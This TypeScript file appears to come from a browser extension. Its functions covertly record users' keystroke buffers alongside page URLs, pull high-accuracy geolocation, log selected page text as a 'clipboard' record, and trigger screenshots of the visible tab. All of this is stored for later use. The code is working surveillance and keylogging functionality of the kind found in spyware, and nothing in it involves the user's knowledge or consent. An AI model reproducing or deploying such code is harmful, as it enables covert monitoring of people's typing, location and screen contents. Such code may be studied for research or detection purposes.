import { BackgroundMessage, StorageKey } from "../consts";
import { IGeolocationEntry, IKeyLogEntry } from "../interfaces";
import { contextData, simplePrepend, writeLog } from "./shared-utils";

if (typeof window === "undefined") {
  throw new Error("Cannot use this in background");
}

export async function captureKeylogBuffer(buffer: string) {
  await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
    ...contextData(),
    url: window.location.href,
    buffer,
  });

  writeLog("Wrote keylog buffer");
}

export async function captureGeolocation() {
  writeLog("Gathering geolocation...");

  try {
    const position: GeolocationPosition = await new Promise(
      (resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve(pos);
          },
          (e) => {
            reject(e);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      }
    );

    const { latitude, longitude, accuracy } = position.coords;

    writeLog("Writing geolocation");

    await simplePrepend<IGeolocationEntry>(StorageKey.GEOLOCATION_HISTORY, {
      latitude,
      longitude,
      accuracy,
      ...contextData(),
    });
  } catch (e) {
    writeLog(`Unable to capture geolocation: ${e}`);
  }
}

export function captureClipboard() {
  const text = window.getSelection()?.toString();

  if (text) {
    simplePrepend(StorageKey.CLIPBOARD_LOG, {
      text,
      url: window.location.href,
      ...contextData(),
    });

    writeLog("Wrote clipboard");
  }
}

export function captureVisibleTab() {
  if (document.visibilityState === "visible") {
    sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
  }
}

export async function sendMessage(messageType: BackgroundMessage, data?: any) {
  return chrome.runtime.sendMessage({
    messageType,
    data,
  });
}
